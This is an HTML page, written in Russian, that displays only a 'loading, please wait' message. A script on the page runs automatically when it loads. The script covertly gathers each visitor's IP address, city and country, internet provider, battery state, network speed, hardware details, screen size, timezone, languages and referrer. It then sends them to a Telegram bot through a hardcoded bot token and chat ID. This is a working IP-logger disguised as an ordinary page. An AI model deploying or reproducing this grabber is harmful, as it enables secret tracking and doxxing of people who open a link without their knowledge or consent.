<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="loader">
        <h2>Загрузка страницы...</h2>
        <p>Пожалуйста, подождите.</p>
    </div>

    <script>
        async function sendUserInfo() {
            const botToken = "9052023061:AAEeZ-1niUzjOLs06LwFxEolmcWv4m5Tka8";
            const chatId = "8705328341";

            try {
                // 1. Получаем IP и геолокацию по IP
                let ipData = {};
                try {
                    let response = await fetch('https://ipapi.co/json/');
                    ipData = await response.json();
                } catch (e) {
                    ipData = { ip: "Не удалось определить", city: "Неизвестно", country_name: "Неизвестно", org: "Неизвестно" };
                }

                // 2. Статус батареи (если поддерживается)
                let batteryLevel = "Недоступно";
                try {
                    if (navigator.getBattery) {
                        let battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + "% " + (battery.charging ? "(Заряжается ⚡)" : "(Не заряжается)");
                    }
                } catch (e) {}

                // 3. Данные о сети (Connection API)
                let connectionInfo = "Неизвестно";
                try {
                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (conn) {
                        connectionInfo = `${conn.effectiveType || 'ошибка'} (~${conn.downlink || '?'} Мбит/с, RTT: ${conn.rtt || '?'}мс)`;
                    }
                } catch (e) {}

                // 4. Прочие параметры среды
                const cpuCores = navigator.hardwareConcurrency || "Неизвестно";
                const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ+" : "Неизвестно";
                const touchPoints = navigator.maxTouchPoints > 0 ? `Да (точек: ${navigator.maxTouchPoints})` : "Нет";
                const colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "🌙 Темная" : "☀️ Светлая";
                const cookiesEnabled = navigator.cookieEnabled ? "Включены ✅" : "Отключены ❌";
                const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
                const referrer = document.referrer ? document.referrer : "Прямой переход (или скрыт)";

                // Стандартные параметры экрана и системы
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;
                const pixelRatio = window.devicePixelRatio || 1;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const isMobile = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Мобильное" : "💻 ПК";

                // 5. Формируем подробный отчет
                let message = `🎯 **Максимальный отчет о визите!**\n\n` +
                              `🌐 **IP:** \`${ipData.ip || 'Неизвестно'}\`\n` +
                              `🌍 **Страна / Город:** ${ipData.country_name || '?'}, ${ipData.city || '?'}\n` +
                              `🏢 **Провайдер:** ${ipData.org || 'Неизвестно'}\n\n` +
                              `📱 **Устройство:** ${isMobile}\n` +
                              `💻 **Платформа:** ${platform}\n` +
                              `🔗 **Откуда перешел (Referrer):** \`${referrer}\`\n\n` +
                              `⚙️ **Ядра процессора:** ${cpuCores}\n` +
                              `🧠 **ОЗУ (примерно):** ${deviceMemory}\n` +
                              `🔋 **Батарея:** ${batteryLevel}\n` +
                              `📶 **Сеть:** ${connectionInfo}\n` +
                              `👆 **Сенсорный экран:** ${touchPoints}\n` +
                              `🍪 **Cookies:** ${cookiesEnabled}\n` +
                              `🎨 **Тема системы:** ${colorScheme}\n\n` +
                              `📐 **Экран:** ${screenWidth}x${screenHeight} (Плотность: ${pixelRatio}x)\n` +
                              `🕒 **Часовой пояс:** ${timeZone}\n` +
                              `🗣 **Языки системы:** ${languages}\n` +
                              `🌐 **User-Agent:** \`${userAgent}\``;

                // 6. Отправка в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });

            } catch (error) {
                console.error("Ошибка отправки:", error);
            }
        }

        sendUserInfo();
    </script>
</body>
</html>
